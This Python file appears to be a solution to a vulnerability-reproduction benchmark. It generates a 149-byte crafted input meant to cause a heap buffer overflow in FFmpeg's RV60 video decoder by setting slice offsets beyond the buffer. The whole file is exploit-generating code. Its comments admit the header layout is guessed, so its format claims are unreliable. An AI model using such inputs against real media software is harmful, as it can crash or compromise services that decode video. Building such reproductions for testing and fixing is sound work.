import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in avcodec/rv60dec.
        The vulnerability involves initializing the slice bitstream reader with an incorrect size,
        typically derived from slice offsets that are not validated against the buffer size.
        """
        # Ground truth length is 149 bytes.
        # We construct a payload of this size.
        length = 149
        payload = bytearray(length)

        # Fill with non-zero "random" data to pass generic non-empty checks
        for i in range(length):
            payload[i] = (i * 37 + 0xAB) % 256

        # Construct a malicious header structure to trigger the OOB read.
        # Hypothesis: The RV60 decoder reads a slice count and then a table of offsets.
        # We attempt to define a frame with 2 slices, where the second slice starts
        # beyond the end of the provided buffer.

        # Heuristic layout usually found in raw packet fuzzing for this codec family:
        # Byte 0: Slice Count
        # Bytes 1-4: Offset for Slice 1
        # Bytes 5-8: Offset for Slice 2
        
        # Set Slice Count to 2
        payload[0] = 0x02

        # Set Offset for Slice 1 to a valid small integer (e.g., 16 bytes in)
        struct.pack_into('<I', payload, 1, 16)

        # Set Offset for Slice 2 to a value larger than the buffer size (e.g., 500)
        # This causes the 'size' calculation or pointer arithmetic to go OOB.
        # When init_get_bits or similar is called with this offset, it triggers the heap buffer overflow
        # (read) when accessed, or a sanitizer error for invalid pointer derivation.
        struct.pack_into('<I', payload, 5, 500)

        # In case the header format expects some frame type flags before the slice table,
        # we also mirror the malicious offset pattern slightly further in the buffer
        # (Shotgun approach for robustness against minor header variations).
        # E.g. at offset 12 (common header skip)
        if length > 20:
             payload[12] = 0x02
             struct.pack_into('<I', payload, 13, 24)
             struct.pack_into('<I', payload, 17, 500)

        return bytes(payload)
